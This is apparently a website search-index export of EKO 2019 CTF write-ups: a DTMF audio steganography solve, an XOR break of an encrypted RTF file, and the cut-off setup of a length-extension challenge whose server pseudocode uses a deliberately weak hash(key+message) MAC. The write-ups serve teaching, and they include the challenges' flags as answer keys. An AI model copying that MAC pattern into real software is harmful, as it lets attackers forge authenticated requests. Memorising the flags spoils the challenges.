dacity)\u00a0and\u00a0match\u00a0each\u00a0time\u00a0a\u00a0key\u00a0was\u00a0pressed\u00a0with\u00a0the\u00a0corresponding\u00a0frequency\u00a0to\u00a0actually\u00a0get\u00a0the\u00a0pressed\u00a0number.\n\n\nFortunately,\u00a0some\u00a0automatic\u00a0tools\u00a0which\u00a0will\u00a0do\u00a0the\u00a0work\u00a0for\u00a0us\u00a0already\u00a0exists.\u00a0\nThe\u00a0one\u00a0I\u00a0used\u00a0was\u00a0\ndtmfcheck\n\u00a0for\u00a0linux.\u00a0It's\u00a0not\u00a0the\u00a0only\u00a0one,\u00a0Audacity\u00a0has\u00a0a\u00a0plugin\u00a0called\u00a0\nphonalyzer\n\u00a0that\u00a0will\u00a0do\u00a0the\u00a0job\u00a0as\u00a0well.\u00a0Otherwise,\u00a0manual\u00a0analysis\u00a0will\u00a0take\u00a0longer\u00a0but\u00a0still\u00a0would\u00a0have\u00a0been\u00a0useful.\u00a0\n\n\nWith\u00a0\ndtmfcheck\n\u00a0we\u00a0just\u00a0need\u00a0to\u00a0run\u00a0provide\u00a0the\u00a0\n.wav\n\u00a0file\u00a0as\u00a0input:\u00a0\n\n\n\nAnalyzing\u00a0the\u00a0output\u00a0we\u00a0will\u00a0see\u00a0that\u00a0we\u00a0have\u00a0the\u00a0numbers\u00a0that\u00a0were\u00a0pressed\u00a0(just\u00a0afrter\u00a0the\u00a0\"Detected\"\u00a0string).\u00a0\nWith\u00a0the\u00a0following\u00a0command\u00a0line\u00a0we\u00a0can\u00a0extract\u00a0them\u00a0without\u00a0any\u00a0space\u00a0between\u00a0them:\u00a0\n\n\ndtmfcheck\u00a0audio_espia.wav\u00a0|\u00a0awk\u00a0-F\u00a0Detected\u00a0'{print\u00a0$2}'\u00a0|\u00a0cut\u00a0-f1\u00a0-d\u00a0'('\u00a0|\u00a0tr\u00a0-d\u00a0\n\\n\n\u00a0|\u00a0tr\u00a0-d\u00a0'\u00a0'\n\n\n\n\nWhy\u00a0we\u00a0put\u00a0it\u00a0all\u00a0of\u00a0them\u00a0together?\u00a0Because\u00a0the\u00a0tool\u00a0is\u00a0capable\u00a0of\u00a0determing\u00a0which\u00a0keys\u00a0were\u00a0pressed\u00a0but\u00a0sometimes\u00a0the\u00a0pause\u00a0between\u00a0them\u00a0may\u00a0cause\u00a0issues.\u00a0For\u00a0example:\u00a0if\u00a0the\u00a0serie\u00a0\n777777\n\u00a0was\u00a0dialed,\u00a0it\u00a0wouldn't\u00a0be\u00a0possible\u00a0to\u00a0distinguish\u00a0between\u00a0\n77\n,\n7777\n\u00a0and\u00a0\n777\n,\n777\n\u00a0(which,\u00a0as\u00a0we\u00a0are\u00a0gonna\u00a0see\u00a0later,\u00a0are\u00a0different\u00a0things).\n\n\nIn\u00a0order\u00a0to\u00a0solve\u00a0that\u00a0we\u00a0should\u00a0carefully\u00a0listen\u00a0again\u00a0the\u00a0audio\u00a0and\u00a0create\u00a0insert\u00a0the\u00a0pauses\u00a0manually\u00a0where\u00a0they\u00a0are.\n\n\nOnce\u00a0this\u00a0action\u00a0is\u00a0carried\u00a0out,\u00a0we\u00a0end\u00a0up\u00a0with\u00a0the\u00a0following\u00a0message:\u00a0\n\n\n8\u00a044\u00a033\u00a07\u00a02\u00a07777\u00a07777\u00a09\u00a0666\u00a0777\u00a03\u00a0444\u00a07777\u00a06\u00a0666\u00a066\u00a055\u00a033\u00a0999\u00a07777\u00a02\u00a0777\u00a033\u00a0222\u00a0666\u00a0666\u00a0555\u00a0444\u00a0333\u00a0999\u00a0666\u00a088\u00a04\u00a0444\u00a0888\u00a033\u00a08\u00a044\u00a033\u00a06\u00a022\u00a02\u00a066\u00a02\u00a066\u00a02\u00a07777\n\n\n\n\nTaking\u00a0into\u00a0account\u00a0that\u00a0it\u00a0should\u00a0be\u00a0a\u00a0message,\u00a0and\u00a0that\u00a0a\u00a0phone\u00a0was\u00a0used,\u00a0it\u00a0is\u00a0possible\u00a0to\u00a0deduce\u00a0that\u00a0it\u00a0was\u00a0written\u00a0as\u00a0SMS\u00a0in\u00a0older\u00a0phones\u00a0used\u00a0to\u00a0do.\u00a0Again,\u00a0some\u00a0googling\u00a0and\u00a0using\u00a0a\u00a0very\u00a0well\u00a0known\u00a0page\u00a0for\u00a0encoding/encryption\u00a0algorithms\u00a0(\ndcode\n),\u00a0we\u00a0find\u00a0out\u00a0that\u00a0we\u00a0have\u00a0a\u00a0way\u00a0to\u00a0\"\"\"decrypt\"\"\"\u00a0it\u00a0(called\u00a0\nMulti-tap\u00a0Cipher\u00a0(SMS\u00a0Mode\u00a0ABC)\n).\n\n\nAfter\u00a0decryption\u00a0we\u00a0get:\u00a0the\u00a0string:\n\n\nTHEPASSWORDISMONKEYSARECOOLIFYOUGIVETHEMBANANAS\n\n\n\n\nDue\u00a0to\u00a0the\u00a0format\u00a0of\u00a0the\u00a0flag\u00a0requires\u00a0the\u00a0\"ONA{}\"\u00a0the\u00a0final\u00a0answer\u00a0is:\u00a0\n\n\n\nONA{8cce9ae2618ea9aff3a00f90c99e570842c528e9}", 
            "title": "Secret Spy Message"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#secret-spy-message", 
            "text": "", 
            "title": "Secret Spy Message"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#description", 
            "text": "Category:\u00a0Steganography\u00a0  Points:\u00a0100\u00a0/\u00a0500\u00a0  Goal:\u00a0Fun\u00a0and\u00a0learn\u00a0about\u00a0DTMF", 
            "title": "Description"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#statement", 
            "text": "Our\u00a0secret\u00a0spy\u00a0has\u00a0recorded\u00a0something\u00a0that\u00a0seems\u00a0useful\u00a0but\u00a0we\u00a0don't\u00a0know\u00a0how!\u00a0Can\u00a0you\u00a0help\u00a0us?\u00a0\nThe\u00a0flag\u00a0is:\u00a0ONA{sha1(password)}  ====  Nuestro\u00a0esp\u00eda\u00a0secreto\u00a0grab\u00f3\u00a0algo\u00a0que\u00a0parece\u00a0ser\u00a0\u00fatil\u00a0pero\u00a0no\u00a0sabemos\u00a0c\u00f3mo\u00a0utilizarlo!\u00a0Nos\u00a0ayud\u00e1s?\nEl\u00a0flag\u00a0es:\u00a0ONA{sha1(password)}", 
            "title": "Statement"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#file", 
            "text": "audio.wav", 
            "title": "File"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#solution", 
            "text": "This\u00a0challenge\u00a0was\u00a0built\u00a0with\u00a0the\u00a0goal\u00a0of\u00a0having\u00a0some\u00a0fun.\u00a0It\u00a0didn't\u00a0require\u00a0knowledge\u00a0but\u00a0just\u00a0a\u00a0little\u00a0bit\u00a0of\u00a0googling\u00a0and\u00a0the\u00a0correct\u00a0tools.\u00a0  The\u00a0file\u00a0provided\u00a0is\u00a0a\u00a0 .wav \u00a0file\u00a0(audio)\u00a0with\u00a0some\u00a0noises.\u00a0If\u00a0you\u00a0listen\u00a0for\u00a0a\u00a0couple\u00a0of\u00a0secs\u00a0the\u00a0audio\u00a0you'll\u00a0notice\u00a0that\u00a0sound\u00a0is\u00a0familiar.\u00a0Seems\u00a0to\u00a0be\u00a0the\u00a0sound\u00a0made\u00a0by\u00a0a\u00a0phone\u00a0when\u00a0you're\u00a0dialing.\u00a0\nIt\u00a0could\u00a0be\u00a0possible\u00a0to\u00a0know\u00a0what\u00a0was\u00a0dialed?  Well,\u00a0this\u00a0sound\u00a0is\u00a0not\u00a0other\u00a0than\u00a0the\u00a0signal\u00a0being\u00a0sent\u00a0through\u00a0the\u00a0telecommunication\u00a0channel.\u00a0With\u00a0some\u00a0googling\u00a0you\u00a0can\u00a0find\u00a0that\u00a0this\u00a0type\u00a0of\u00a0encoding\u00a0is\u00a0called\u00a0DTMF.\u00a0  So\u00a0now\u00a0we\u00a0have\u00a0an\u00a0audio\u00a0of\u00a0DTMF\u00a0tones\u00a0that\u00a0we\u00a0want\u00a0to\u00a0decode\u00a0(we\u00a0want\u00a0to\u00a0get\u00a0the\u00a0key\u00a0that\u00a0was\u00a0pressed\u00a0from\u00a0its\u00a0sound).  The\u00a0following\u00a0table\u00a0can\u00a0be\u00a0found\u00a0in\u00a0this\u00a0 link :  It\u00a0depicts\u00a0the\u00a0combination\u00a0of\u00a0frequencies\u00a0for\u00a0each\u00a0of\u00a0the\u00a0different\u00a0numbers.  Therefore,\u00a0we\u00a0could\u00a0analyze\u00a0the\u00a0frequency\u00a0spectrum\u00a0of\u00a0the\u00a0audio\u00a0with\u00a0some\u00a0tool\u00a0(like\u00a0Audacity)\u00a0and\u00a0match\u00a0each\u00a0time\u00a0a\u00a0key\u00a0was\u00a0pressed\u00a0with\u00a0the\u00a0corresponding\u00a0frequency\u00a0to\u00a0actually\u00a0get\u00a0the\u00a0pressed\u00a0number.  Fortunately,\u00a0some\u00a0automatic\u00a0tools\u00a0which\u00a0will\u00a0do\u00a0the\u00a0work\u00a0for\u00a0us\u00a0already\u00a0exists.\u00a0\nThe\u00a0one\u00a0I\u00a0used\u00a0was\u00a0 dtmfcheck \u00a0for\u00a0linux.\u00a0It's\u00a0not\u00a0the\u00a0only\u00a0one,\u00a0Audacity\u00a0has\u00a0a\u00a0plugin\u00a0called\u00a0 phonalyzer \u00a0that\u00a0will\u00a0do\u00a0the\u00a0job\u00a0as\u00a0well.\u00a0Otherwise,\u00a0manual\u00a0analysis\u00a0will\u00a0take\u00a0longer\u00a0but\u00a0still\u00a0would\u00a0have\u00a0been\u00a0useful.\u00a0  With\u00a0 dtmfcheck \u00a0we\u00a0just\u00a0need\u00a0to\u00a0run\u00a0provide\u00a0the\u00a0 .wav \u00a0file\u00a0as\u00a0input:\u00a0  Analyzing\u00a0the\u00a0output\u00a0we\u00a0will\u00a0see\u00a0that\u00a0we\u00a0have\u00a0the\u00a0numbers\u00a0that\u00a0were\u00a0pressed\u00a0(just\u00a0afrter\u00a0the\u00a0\"Detected\"\u00a0string).\u00a0\nWith\u00a0the\u00a0following\u00a0command\u00a0line\u00a0we\u00a0can\u00a0extract\u00a0them\u00a0without\u00a0any\u00a0space\u00a0between\u00a0them:\u00a0  dtmfcheck\u00a0audio_espia.wav\u00a0|\u00a0awk\u00a0-F\u00a0Detected\u00a0'{print\u00a0$2}'\u00a0|\u00a0cut\u00a0-f1\u00a0-d\u00a0'('\u00a0|\u00a0tr\u00a0-d\u00a0 \\n \u00a0|\u00a0tr\u00a0-d\u00a0'\u00a0'  Why\u00a0we\u00a0put\u00a0it\u00a0all\u00a0of\u00a0them\u00a0together?\u00a0Because\u00a0the\u00a0tool\u00a0is\u00a0capable\u00a0of\u00a0determing\u00a0which\u00a0keys\u00a0were\u00a0pressed\u00a0but\u00a0sometimes\u00a0the\u00a0pause\u00a0between\u00a0them\u00a0may\u00a0cause\u00a0issues.\u00a0For\u00a0example:\u00a0if\u00a0the\u00a0serie\u00a0 777777 \u00a0was\u00a0dialed,\u00a0it\u00a0wouldn't\u00a0be\u00a0possible\u00a0to\u00a0distinguish\u00a0between\u00a0 77 , 7777 \u00a0and\u00a0 777 , 777 \u00a0(which,\u00a0as\u00a0we\u00a0are\u00a0gonna\u00a0see\u00a0later,\u00a0are\u00a0different\u00a0things).  In\u00a0order\u00a0to\u00a0solve\u00a0that\u00a0we\u00a0should\u00a0carefully\u00a0listen\u00a0again\u00a0the\u00a0audio\u00a0and\u00a0create\u00a0insert\u00a0the\u00a0pauses\u00a0manually\u00a0where\u00a0they\u00a0are.  Once\u00a0this\u00a0action\u00a0is\u00a0carried\u00a0out,\u00a0we\u00a0end\u00a0up\u00a0with\u00a0the\u00a0following\u00a0message:\u00a0  8\u00a044\u00a033\u00a07\u00a02\u00a07777\u00a07777\u00a09\u00a0666\u00a0777\u00a03\u00a0444\u00a07777\u00a06\u00a0666\u00a066\u00a055\u00a033\u00a0999\u00a07777\u00a02\u00a0777\u00a033\u00a0222\u00a0666\u00a0666\u00a0555\u00a0444\u00a0333\u00a0999\u00a0666\u00a088\u00a04\u00a0444\u00a0888\u00a033\u00a08\u00a044\u00a033\u00a06\u00a022\u00a02\u00a066\u00a02\u00a066\u00a02\u00a07777  Taking\u00a0into\u00a0account\u00a0that\u00a0it\u00a0should\u00a0be\u00a0a\u00a0message,\u00a0and\u00a0that\u00a0a\u00a0phone\u00a0was\u00a0used,\u00a0it\u00a0is\u00a0possible\u00a0to\u00a0deduce\u00a0that\u00a0it\u00a0was\u00a0written\u00a0as\u00a0SMS\u00a0in\u00a0older\u00a0phones\u00a0used\u00a0to\u00a0do.\u00a0Again,\u00a0some\u00a0googling\u00a0and\u00a0using\u00a0a\u00a0very\u00a0well\u00a0known\u00a0page\u00a0for\u00a0encoding/encryption\u00a0algorithms\u00a0( dcode ),\u00a0we\u00a0find\u00a0out\u00a0that\u00a0we\u00a0have\u00a0a\u00a0way\u00a0to\u00a0\"\"\"decrypt\"\"\"\u00a0it\u00a0(called\u00a0 Multi-tap\u00a0Cipher\u00a0(SMS\u00a0Mode\u00a0ABC) ).  After\u00a0decryption\u00a0we\u00a0get:\u00a0the\u00a0string:  THEPASSWORDISMONKEYSARECOOLIFYOUGIVETHEMBANANAS  Due\u00a0to\u00a0the\u00a0format\u00a0of\u00a0the\u00a0flag\u00a0requires\u00a0the\u00a0\"ONA{}\"\u00a0the\u00a0final\u00a0answer\u00a0is:\u00a0  ONA{8cce9ae2618ea9aff3a00f90c99e570842c528e9}", 
            "title": "Solution"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/", 
            "text": "The Rich Text\n\n\nDescription\n\n\n\n\nCategory: Cryptography\n\n\nPoints:\u00a0150\u00a0/\u00a0500\u00a0\n\n\nGoal: Understand the risks of XORing\n\n\n\n\nStatement\n\n\nA student has encrypted a file with a really powerful technique (according to him). Can you decrypt it?\n\n\n====\n\n\nUn estudiante cifr\u00f3 un archivo con una poderosa t\u00e9cnica (seg\u00fan \u00e9l). Pod\u00e9s decifrarlo?\n\n\nFile\n\n\nencrypted text\n\n\nSolution\n\n\nThe very first part of this challenge aimed to play with a little bit of deduction from \"metainformation\". In other words:\n\n\n\n\nYou've been provided with an encrypted file and nothing else.\n\n\nThe amount of points of this challenge isn't high, meaning that the technique should be something easy. \n\n\nQuote from the statement: \"[..] with a powerful technique (according to him) [...] \"\n\n\n\n\nWhat is the most common technique that usually people think is really good for encrypting data but almost always fails to work? And also this technique should be known by any student?\nYes! The answer is XOR. \n\n\nNow, even if we know that a XOR was used, we need to know against what was XORed to try to recover the information. \n\n\nFrom where else can we get some data.. Maybe from the title of the challenge? \"The Rich text\" ? \nAfter some \ngoogling\n, the first finding talks about a very well known file format (\n.rtf\n). \n\n\nSo at this point, we can think that we know the format of the file that was XORed. If we know the format, means that we know some information of the file, in particular, most formats have what are called \nmagic bytes\n that should be present always. \n\n\nThe magic bytes of \n.rtf\n are: \n7B 5C 72 74 66 31\n or in ascii: \n{\\rtf1\n. These should be the first 6 bytes of our result. \n\n\nDoing some math:\n\n\n\n\nplain_text \u2295 key = cipher_text \n\n\nplain_text = cipher_text \u2295 key\n\n\nplain_text \u2295 cipher_text = key\n\n\n\n\nWe don't actually know the length of the key, but we can try to XOR the first 6 bytes (length of \n.rtf\n magic bytes) of the cipher_text against the magic bytes to get the first 6 bytes of the key:\n\n\nxxd -l 6 text.enc\n00000000: aa59 4264 7f51                           .YBd.Q\n\n\n\n\nThen, I used the following tiny python3 script:\n\n\nimport binascii \ncipher_text = b\n\\xaa\\x59\\x42\\x64\\x7f\\x51\n\nmagic_bytes = b\n\\x7b\\x5c\\x72\\x74\\x66\\x31\n\nresult = bytearray()\nfor i in range(6):\n    result.append(cipher_text[i] ^ magic_bytes[i])\nprint(binascii.hexlify(result))\n\n\n\n\nThe answer was: b'd10530101960'. \nWhich means that the first 6 bytes of our key are: \nD1 05 30 10 19 60\n.\n\n\nNow, lets try to XOR the ciphertext against the key (key with 6 bytes) and see if we can get an interesting (or potentially all) part of the plain text (as step 2. in math part stated).\n\n\nFor this I used almost the same python3 script but adapted:\n\n\nimport sys\ncipher_text = bytearray(open(sys.argv[1], 'rb').read())\nkey = b\n\\xd1\\x05\\x30\\x10\\x19\\x60\n\nresult = bytearray()\nfor i in range(len(cipher_text)):\n    result.append(cipher_text[i] ^ key[i%len(key)])\nopen(\noutput.rtf\n, 'wb').write(result)\n\n\n\n\nIf we run this script a file \noutput.rtf\n will appear.\nLuckily this file is the complete \n.rtf\n file and we can get the flag in plain text from there: \n\n\ncat output.rtf\n\n{\\rtf1\\ansi\\deff3\\adeflang1025\n{\\fonttbl{\\f0\\froman\\fprq2\\fcharset0 Times New Roman;}{\\f1\\froman\\fprq2\\fcharset2 Symbol;}{\\f2\\fswiss\\fprq2\\fcharset0 Arial;}{\\f3\\froman\\fprq2\\fcharset0 Liberation Serif{\\*\\falt Times New Roman};}{\\f4\\fswiss\\fprq2\\fcharset0 Liberation Sans{\\*\\falt Arial};}{\\f5\\fnil\\fprq2\\fcharset0 Noto Sans CJK SC Regular;}{\\f6\\fnil\\fprq2\\fcharset0 FreeSans;}{\\f7\\fswiss\\fprq0\\fcharset0 FreeSans;}}\n{\\colortbl;\\red0\\green0\\blue0;\\red0\\green0\\blue255;\\red0\\green255\\blue255;\\red0\\green255\\blue0;\\red255\\green0\\blue255;\\red255\\green0\\blue0;\\red255\\green255\\blue0;\\red255\\green255\\blue255;\\red0\\green0\\blue128;\\red0\\green128\\blue128;\\red0\\green128\\blue0;\\red128\\green0\\blue128;\\red128\\green0\\blue0;\\red128\\green128\\blue0;\\red128\\green128\\blue128;\\red192\\green192\\blue192;}\n{\\stylesheet{\\s0\\snext0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033 Normal;}\n{\\s15\\sbasedon0\\snext16\\sb240\\sa120\\keepn\\dbch\\af5\\dbch\\af6\\afs28\\loch\\f4\\fs28 Heading;}\n{\\s16\\sbasedon0\\snext16\\sl288\\slmult1\\sb0\\sa140 Text Body;}\n{\\s17\\sbasedon16\\snext17\\sl288\\slmult1\\sb0\\sa140\\dbch\\af7 List;}\n{\\s18\\sbasedon0\\snext18\\sb120\\sa120\\noline\\i\\dbch\\af7\\afs24\\ai\\fs24 Caption;}\n{\\s19\\sbasedon0\\snext19\\noline\\dbch\\af7 Index;}\n}{\\*\\generator LibreOffice/5.1.6.2$Linux_X86_64 LibreOffice_project/10m0$Build-2}{\\info{\\creatim\\yr2019\\mo9\\dy10\\hr11\\min5}{\\revtim\\yr2019\\mo9\\dy10\\hr11\\min6}{\\printim\\yr0\\mo0\\dy0\\hr0\\min0}}\\deftab709\n\\viewscale100\n{\\*\\pgdsctbl\n{\\pgdsc0\\pgdscuse451\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\pgdscnxt0 Default Style;}}\n\\formshade\\paperh15840\\paperw12240\\margl1134\\margr1134\\margt1134\\margb1134\\sectd\\sbknone\\sectunlocked1\\pgndec\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\ftnbj\\ftnstart1\\ftnrstcont\\ftnnar\\aenddoc\\aftnrstcont\\aftnstart1\\aftnnrlc\n{\\*\\ftnsep\\chftnsep}\\pgndec\\pard\\plain \\s0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033{\\rtlch \\ltrch\\loch\nThe flag is: ONA\\{b06901c39072abf000563ea92968cbf93b26d4d4\\}}\n\\par }% \n\n\n\n\nTherefore, the flag was \n\n\nONA{b06901c39072abf000563ea92968cbf93b26d4d4}", 
            "title": "The Rich Text"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#the-rich-text", 
            "text": "", 
            "title": "The Rich Text"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#description", 
            "text": "Category: Cryptography  Points:\u00a0150\u00a0/\u00a0500\u00a0  Goal: Understand the risks of XORing", 
            "title": "Description"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#statement", 
            "text": "A student has encrypted a file with a really powerful technique (according to him). Can you decrypt it?  ====  Un estudiante cifr\u00f3 un archivo con una poderosa t\u00e9cnica (seg\u00fan \u00e9l). Pod\u00e9s decifrarlo?", 
            "title": "Statement"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#file", 
            "text": "encrypted text", 
            "title": "File"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#solution", 
            "text": "The very first part of this challenge aimed to play with a little bit of deduction from \"metainformation\". In other words:   You've been provided with an encrypted file and nothing else.  The amount of points of this challenge isn't high, meaning that the technique should be something easy.   Quote from the statement: \"[..] with a powerful technique (according to him) [...] \"   What is the most common technique that usually people think is really good for encrypting data but almost always fails to work? And also this technique should be known by any student?\nYes! The answer is XOR.   Now, even if we know that a XOR was used, we need to know against what was XORed to try to recover the information.   From where else can we get some data.. Maybe from the title of the challenge? \"The Rich text\" ? \nAfter some  googling , the first finding talks about a very well known file format ( .rtf ).   So at this point, we can think that we know the format of the file that was XORed. If we know the format, means that we know some information of the file, in particular, most formats have what are called  magic bytes  that should be present always.   The magic bytes of  .rtf  are:  7B 5C 72 74 66 31  or in ascii:  {\\rtf1 . These should be the first 6 bytes of our result.   Doing some math:   plain_text \u2295 key = cipher_text   plain_text = cipher_text \u2295 key  plain_text \u2295 cipher_text = key   We don't actually know the length of the key, but we can try to XOR the first 6 bytes (length of  .rtf  magic bytes) of the cipher_text against the magic bytes to get the first 6 bytes of the key:  xxd -l 6 text.enc\n00000000: aa59 4264 7f51                           .YBd.Q  Then, I used the following tiny python3 script:  import binascii \ncipher_text = b \\xaa\\x59\\x42\\x64\\x7f\\x51 \nmagic_bytes = b \\x7b\\x5c\\x72\\x74\\x66\\x31 \nresult = bytearray()\nfor i in range(6):\n    result.append(cipher_text[i] ^ magic_bytes[i])\nprint(binascii.hexlify(result))  The answer was: b'd10530101960'. \nWhich means that the first 6 bytes of our key are:  D1 05 30 10 19 60 .  Now, lets try to XOR the ciphertext against the key (key with 6 bytes) and see if we can get an interesting (or potentially all) part of the plain text (as step 2. in math part stated).  For this I used almost the same python3 script but adapted:  import sys\ncipher_text = bytearray(open(sys.argv[1], 'rb').read())\nkey = b \\xd1\\x05\\x30\\x10\\x19\\x60 \nresult = bytearray()\nfor i in range(len(cipher_text)):\n    result.append(cipher_text[i] ^ key[i%len(key)])\nopen( output.rtf , 'wb').write(result)  If we run this script a file  output.rtf  will appear.\nLuckily this file is the complete  .rtf  file and we can get the flag in plain text from there:   cat output.rtf\n\n{\\rtf1\\ansi\\deff3\\adeflang1025\n{\\fonttbl{\\f0\\froman\\fprq2\\fcharset0 Times New Roman;}{\\f1\\froman\\fprq2\\fcharset2 Symbol;}{\\f2\\fswiss\\fprq2\\fcharset0 Arial;}{\\f3\\froman\\fprq2\\fcharset0 Liberation Serif{\\*\\falt Times New Roman};}{\\f4\\fswiss\\fprq2\\fcharset0 Liberation Sans{\\*\\falt Arial};}{\\f5\\fnil\\fprq2\\fcharset0 Noto Sans CJK SC Regular;}{\\f6\\fnil\\fprq2\\fcharset0 FreeSans;}{\\f7\\fswiss\\fprq0\\fcharset0 FreeSans;}}\n{\\colortbl;\\red0\\green0\\blue0;\\red0\\green0\\blue255;\\red0\\green255\\blue255;\\red0\\green255\\blue0;\\red255\\green0\\blue255;\\red255\\green0\\blue0;\\red255\\green255\\blue0;\\red255\\green255\\blue255;\\red0\\green0\\blue128;\\red0\\green128\\blue128;\\red0\\green128\\blue0;\\red128\\green0\\blue128;\\red128\\green0\\blue0;\\red128\\green128\\blue0;\\red128\\green128\\blue128;\\red192\\green192\\blue192;}\n{\\stylesheet{\\s0\\snext0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033 Normal;}\n{\\s15\\sbasedon0\\snext16\\sb240\\sa120\\keepn\\dbch\\af5\\dbch\\af6\\afs28\\loch\\f4\\fs28 Heading;}\n{\\s16\\sbasedon0\\snext16\\sl288\\slmult1\\sb0\\sa140 Text Body;}\n{\\s17\\sbasedon16\\snext17\\sl288\\slmult1\\sb0\\sa140\\dbch\\af7 List;}\n{\\s18\\sbasedon0\\snext18\\sb120\\sa120\\noline\\i\\dbch\\af7\\afs24\\ai\\fs24 Caption;}\n{\\s19\\sbasedon0\\snext19\\noline\\dbch\\af7 Index;}\n}{\\*\\generator LibreOffice/5.1.6.2$Linux_X86_64 LibreOffice_project/10m0$Build-2}{\\info{\\creatim\\yr2019\\mo9\\dy10\\hr11\\min5}{\\revtim\\yr2019\\mo9\\dy10\\hr11\\min6}{\\printim\\yr0\\mo0\\dy0\\hr0\\min0}}\\deftab709\n\\viewscale100\n{\\*\\pgdsctbl\n{\\pgdsc0\\pgdscuse451\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\pgdscnxt0 Default Style;}}\n\\formshade\\paperh15840\\paperw12240\\margl1134\\margr1134\\margt1134\\margb1134\\sectd\\sbknone\\sectunlocked1\\pgndec\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\ftnbj\\ftnstart1\\ftnrstcont\\ftnnar\\aenddoc\\aftnrstcont\\aftnstart1\\aftnnrlc\n{\\*\\ftnsep\\chftnsep}\\pgndec\\pard\\plain \\s0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033{\\rtlch \\ltrch\\loch\nThe flag is: ONA\\{b06901c39072abf000563ea92968cbf93b26d4d4\\}}\n\\par }%   Therefore, the flag was   ONA{b06901c39072abf000563ea92968cbf93b26d4d4}", 
            "title": "Solution"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/", 
            "text": "Defuse the bomb\n\n\nDescription\n\n\n\n\nCategory: Cryptography\n\n\nPoints:\u00a0250\u00a0/\u00a0500\n\n\nGoal: Be aware of the Merkle\u2013Damg\u00e5rd weaskness, called Length Extension Attack.\n\n\n\n\nStatement\n\n\nUn grupo apodado MonkeyBananas nos hacke\u00f3. En algun lado que no sabemos donde, dejaron una \"bomba\". No sabemos que hace esa \"bomba\", pero creemos que una vez que \"explote\" puede llegar a borrar todos los datos que tenemos almacenados en nuestros servidores. Necesitamos que nos ayudes a evitar que esto pase, tenemos s\u00f3lo 3 d\u00edas. \n\n\nClaramente, nos est\u00e1n poniendo a prueba.. nos dieron el c\u00f3digo de un servidor que hace de \"Interruptor\". Si enviamos el request correcto a ese servidor vamos a poder desactivar la bomba, pero.. no parece tan facil ya que est\u00e1n usando alg\u00fan tipo de algoritmo criptogr\u00e1fico para evitar que puedas cambiar los par\u00e1metros del request a gusto. No est\u00e1 el c\u00f3digo completo del servidor que recibe dicho request, pero nos aseguraron que con lo que nos pasaron es suficiente. \n\n\nDe casualidad, uno de nuestros sistemas de defensa, pudo capturar el trafico de el request que hicieron ellos al interruptor para activar la alarma, espero que sirva de algo!\n\n\nEl flag es el SHA1 del TAG que deber\u00edas mandar para desactivar la bomba. \nSuerte!\n\n\n===========================================================\n\n\nA group called MonkeyBananas hacked us. They left a \"bomb\" somewhere, but we don't know wehere. Furthermore, we don't know what this \"bomb\" does, but we believe that once it \"blows\" its gonna delete all data stored in our servers. We need your help, we have only 3 days. \n\n\nClearly, they're challenging us, due to they gave us the source code of a server which works as a \"switch\". If we send the correct request to that server we will be able to defuse the bomb, but... it doesn't seems that easy because they're using some kind of crypto algorithm to avoid arbitrary tampering the parameters. The source code is not complete, but they ensure us that in that file we have all we need.\n\n\nFortunately, one of our defense systems, was able to capture the request that this guys sent to the \"switch\" when they activated the bomb, hope this is useful!\n\n\nThe flag is the SHA1 of the TAG value you should submit in order to defuse the bomb.\nGood luck!\n\n\nFile\n\n\nThese are the files that were provided by MonkeyBananas:\n\n\nServer pseudocode\n\n\n#!/usr/bin/env python3\nimport urllib\n# NOOO! Alguien elimin\u00f3 esto!\nimport %%%%%% as remolino\n\nclass Server:\n        def __init__(self):\n                ...\n                self.generate_mac_key()\n                ...\n\n        def generate_mac_key(self):\n                self.mac_key = b\nTh1s1sS3cure4sH3ll\n + os.urandom(14)\n\n        def check_tag(self, tag, params):\n                decoded_params = urllib.parse.unquote_to_bytes(params)\n                return tag == remolino.new(self.mac_key+decoded_params).hexdigest()\n\n        def parse_params(self, body):\n                return dict(param_value.split(\n=\n) for param_value in body.split(\n))\n\n        def serve_for_ever(self):\n                ...\n\n        def doget(self, request):\n                ...\n\n        def dopost(self, request):\n                ...\n                ct = request.headers.get(\nContent-type\n)\n                if not form_urlencoded(ct.lower()):\n                        return error()\n                tag = request.headers.get(\nTag\n)\n                params = request.body()\n                if self.check_tag(tag, params):\n                        params = parse_params(urllib.parse.unquote(params))\n                        if params['action'] == 'activate':\n                                activate_bomb()\n                        elif params['action'] == 'defuse':\n                                defuse_bomb()\n                        else:\n                                ....\n                else:\n                        return error()\n                ...\n        ...\nserver = Server()\nserver.serve_for_ever()\n\n\n\n\n\n\nRequest\n\n\nPOST /bombing HTTP/1.1\nHost: www.dibombjasbinplanted.com\nContent-Type: application/x-www-form-urlencoded\nTag: 